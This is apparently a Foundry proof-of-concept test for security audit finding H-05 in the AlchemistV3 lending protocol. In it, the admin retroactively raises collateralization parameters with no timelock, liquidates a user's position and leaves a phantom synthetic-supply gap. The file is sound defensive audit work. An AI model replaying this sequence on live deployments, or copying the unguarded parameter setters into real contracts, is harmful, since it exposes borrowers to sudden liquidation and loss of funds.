// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

/// @notice PoC for H-05 [DEPTH-ST-4/ST-7]: Retroactive collateralizationLowerBound
///         → Mass Liquidation → Permanent Brick
///
/// Attack vector:
/// 1. Alice borrows at minimumCollateralization (~111%)
/// 2. Admin raises liquidationTargetCollateralization and globalMinimumCollateralization
/// 3. Admin raises minimumCollateralization above Alice's ratio
/// 4. Admin raises collateralizationLowerBound above Alice's ratio
/// 5. Alice's position is immediately liquidatable (no grace period)
/// 6. Liquidation triggers phantom totalSyntheticsIssued (H-01)
///
/// Finding: H-05 | Severity: High | CONFIRMED (PoC verified)

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {IERC20} from "lib/openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {TransparentUpgradeableProxy} from "lib/openzeppelin-contracts/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

import {AlchemistV3} from "../../AlchemistV3.sol";
import {AlchemistV3Position} from "../../AlchemistV3Position.sol";
import {AlchemistV3PositionRenderer} from "../../AlchemistV3PositionRenderer.sol";
import {AlchemistTokenVault} from "../../AlchemistTokenVault.sol";
import {AlchemistStrategyClassifier} from "../../AlchemistStrategyClassifier.sol";
import {Transmuter} from "../../Transmuter.sol";
import {AlchemicTokenV3} from "../mocks/AlchemicTokenV3.sol";
import {TestERC20} from "../mocks/TestERC20.sol";
import {MockYieldToken} from "../mocks/MockYieldToken.sol";
import {MockMYTStrategy} from "../mocks/MockMYTStrategy.sol";
import {MockAlchemistAllocator} from "../mocks/MockAlchemistAllocator.sol";
import {MYTTestHelper} from "../libraries/MYTTestHelper.sol";
import {TokenUtils} from "../../libraries/TokenUtils.sol";
import {ITransmuter} from "../../interfaces/ITransmuter.sol";
import {IAlchemistV3, AlchemistInitializationParams} from "../../interfaces/IAlchemistV3.sol";
import {IVaultV2} from "lib/vault-v2/src/interfaces/IVaultV2.sol";
import {VaultV2} from "lib/vault-v2/src/VaultV2.sol";
import {IMYTStrategy} from "../../interfaces/IMYTStrategy.sol";

contract PocRetroactiveCollateralizationTest is Test {
    AlchemistV3 alchemist;
    Transmuter transmuter;
    AlchemistV3Position alchemistNFT;
    AlchemistTokenVault alchemistFeeVault;
    TransparentUpgradeableProxy proxyAlchemist;
    AlchemistV3 alchemistLogic;
    AlchemicTokenV3 alToken;
    VaultV2 vault;
    MockAlchemistAllocator allocator;
    MockMYTStrategy mytStrategy;

    address admin    = address(0x4444444444444444444444444444444444444444);
    address curator  = address(0x8888888888888888888888888888888888888888);
    address operator = address(0x2222222222222222222222222222222222222222);
    address alOwner;

    address mockVaultCollateral;
    address mockStrategyYieldToken;

    uint256 constant FIXED_POINT_SCALAR = 1e18;
    uint256 minimumCollateralization = FIXED_POINT_SCALAR * FIXED_POINT_SCALAR / 9e17; // ~111.11%
    uint256 liquidationTargetCollateralization = uint256(1e36) / 88e16; // ~113.6%

    address alice = address(0xA1CE);
    address liquidator = address(0xDEAD);

    function setUp() public {
        vm.startPrank(admin);
        mockVaultCollateral  = address(new TestERC20(1_000_000e18, 18));
        mockStrategyYieldToken = address(new MockYieldToken(mockVaultCollateral));
        vault = MYTTestHelper._setupVault(mockVaultCollateral, admin, curator);
        mytStrategy = MYTTestHelper._setupStrategy(
            address(vault), mockStrategyYieldToken, admin, "MockToken", "MockProto", IMYTStrategy.RiskClass.LOW
        );
        allocator = new MockAlchemistAllocator(
            address(vault), admin, operator, address(new AlchemistStrategyClassifier(admin))
        );
        vm.stopPrank();

        vm.startPrank(curator);
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.setIsAllocator, (address(allocator), true)));
        vault.setIsAllocator(address(allocator), true);
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.addAdapter, address(mytStrategy)));
        vault.addAdapter(address(mytStrategy));
        bytes memory idData = mytStrategy.getIdData();
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.increaseAbsoluteCap, (idData, 2_000_000_000e18)));
        vault.increaseAbsoluteCap(idData, 2_000_000_000e18);
        _vaultSubmitAndFastForward(abi.encodeCall(IVaultV2.increaseRelativeCap, (idData, 1e18)));
        vault.increaseRelativeCap(idData, 1e18);
        vm.stopPrank();

        address proxyOwner = address(this);
        vm.startPrank(alOwner = address(0xdead));

        alToken = new AlchemicTokenV3("", "", 0);

        ITransmuter.TransmuterInitializationParams memory tParams = ITransmuter.TransmuterInitializationParams({
            syntheticToken:   address(alToken),
            feeReceiver:      address(this),
            timeToTransmute:  5_256_000,
            transmutationFee: 0,
            exitFee:          0,
            graphSize:        52_560_000
        });
        transmuter = new Transmuter(tParams);
        alchemistLogic = new AlchemistV3();

        AlchemistInitializationParams memory params = AlchemistInitializationParams({
            admin:                           alOwner,
            debtToken:                       address(alToken),
            underlyingToken:                 vault.asset(),
            depositCap:                      type(uint256).max,
            minimumCollateralization:        minimumCollateralization,
            collateralizationLowerBound:     1_052_631_578_950_000_000, // 105.26%
            globalMinimumCollateralization:  1_111_111_111_111_111_111, // 111.11%
            liquidationTargetCollateralization: liquidationTargetCollateralization,
            transmuter:                      address(transmuter),
            protocolFee:                     0,
            protocolFeeReceiver:             address(this),
            liquidatorFee:                   300,
            repaymentFee:                    100,
            myt:                             address(vault)
        });

        proxyAlchemist = new TransparentUpgradeableProxy(
            address(alchemistLogic), proxyOwner, abi.encodeWithSelector(AlchemistV3.initialize.selector, params)
        );
        alchemist = AlchemistV3(address(proxyAlchemist));
        alToken.setWhitelist(address(proxyAlchemist), true);
        transmuter.setAlchemist(address(alchemist));
        transmuter.setDepositCap(uint256(type(int256).max));

        alchemistNFT = new AlchemistV3Position(address(alchemist), alOwner);
        alchemistNFT.setMetadataRenderer(address(new AlchemistV3PositionRenderer()));
        alchemist.setAlchemistPositionNFT(address(alchemistNFT));
        alchemistFeeVault = new AlchemistTokenVault(vault.asset(), address(alchemist), alOwner);
        alchemistFeeVault.setAuthorization(address(alchemist), true);
        alchemist.setAlchemistFeeVault(address(alchemistFeeVault));
        vm.stopPrank();

        // Fund alice
        _magicDepositToVault(alice, 10_000e18);

        // Allocate vault assets to the strategy
        uint256 assetsToAllocate = vault.convertToAssets(vault.totalSupply());
        deal(mockVaultCollateral, address(vault), 1_000_000e18);
        vm.prank(admin);
        allocator.allocate(address(mytStrategy), assetsToAllocate);
    }

    function _vaultSubmitAndFastForward(bytes memory data) internal {
        vault.submit(data);
        bytes4 sel = bytes4(data);
        vm.warp(block.timestamp + vault.timelock(sel));
    }

    function _magicDepositToVault(address depositor, uint256 amount) internal {
        deal(mockVaultCollateral, depositor, amount);
        vm.startPrank(depositor);
        TokenUtils.safeApprove(mockVaultCollateral, address(vault), amount);
        vault.deposit(amount, depositor);
        vm.stopPrank();
    }

    // ================================================================
    // PoC: Admin chains parameter changes to make positions liquidatable
    // retroactively. No grace period, no timelock on these setters.
    // ================================================================
    function test_retroactive_param_mass_liquidation_brick() public {
        // 1. Alice deposits and borrows at max safe level (~111%)
        uint256 aliceShares = vault.balanceOf(alice);

        vm.startPrank(alice);
        IERC20(address(vault)).approve(address(alchemist), aliceShares);
        (uint256 tokenId,) = alchemist.deposit(aliceShares, alice, 0);

        // Borrow at maximum (collateralization ratio = minimumCollateralization)
        uint256 maxMint = alchemist.totalValue(tokenId) * FIXED_POINT_SCALAR / minimumCollateralization;
        alchemist.mint(tokenId, maxMint, alice);
        vm.stopPrank();

        // Position is healthy
        (uint256 collateralBefore,,) = alchemist.getCDP(tokenId);
        console.log("Alice collateral (debt units) before:", collateralBefore);

        uint256 tsiBefore = alchemist.totalSyntheticsIssued();
        console.log("totalSyntheticsIssued before:", tsiBefore);

        // 2. Admin chains parameter changes (all instant, no timelock):
        //    a) Raise liquidationTargetCollateralization to 200%
        vm.prank(alOwner);
        alchemist.setLiquidationTargetCollateralization(2e18);

        //    b) Raise globalMinimumCollateralization to 200%
        vm.prank(alOwner);
        alchemist.setGlobalMinimumCollateralization(2e18);

        //    c) Raise minimumCollateralization to 150%
        vm.prank(alOwner);
        alchemist.setMinimumCollateralization(15e17);

        //    d) Raise collateralizationLowerBound to 130% (must be < minCollateralization of 150%)
        vm.prank(alOwner);
        alchemist.setCollateralizationLowerBound(13e17);

        // 3. Alice's position is now immediately liquidatable
        //    Her ratio is ~111%, new lower bound is 130%
        console.log("New collateralizationLowerBound:", alchemist.collateralizationLowerBound());
        console.log("New minimumCollateralization:   ", alchemist.minimumCollateralization());

        // 4. Liquidator triggers liquidation
        vm.prank(liquidator);
        alchemist.liquidate(tokenId);

        // 5. Verify phantom totalSyntheticsIssued remains
        uint256 tsiAfter = alchemist.totalSyntheticsIssued();
        uint256 tdAfter  = alchemist.totalDebt();

        console.log("=== H-05 CONFIRMED ===");
        console.log("totalSyntheticsIssued after liquidation:", tsiAfter);
        console.log("totalDebt after liquidation:            ", tdAfter);
        console.log("Phantom gap:                            ", tsiAfter - tdAfter);

        assertGt(tsiAfter, 0, "H-05: phantom totalSyntheticsIssued after retroactive liquidation");
    }
}
